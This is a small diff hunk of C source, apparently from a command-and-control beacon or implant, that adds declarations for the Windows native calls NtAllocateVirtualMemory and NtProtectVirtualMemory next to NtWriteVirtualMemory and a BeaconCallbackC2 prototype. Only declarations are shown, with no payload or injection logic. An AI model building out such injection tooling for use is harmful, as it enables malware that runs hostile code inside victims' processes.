@@ -37,6 +37,23 @@ LPCWSTR* BeaconCallbackC2(
     DWORD SendBufferSize
 );
 
+NTSTATUS(*NtAllocateVirtualMemory)(
+    HANDLE ProcessHandle, 
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+NTSTATUS(*NtProtectVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    PSIZE_T NumberOfBytesToProtect,
+    ULONG NewAccessProtection,
+    PULONG OldAccessProtection
+);
+
 NTSTATUS(*NtWriteVirtualMemory)(
     HANDLE hProcess, 
     PVOID lpBaseAddress, 
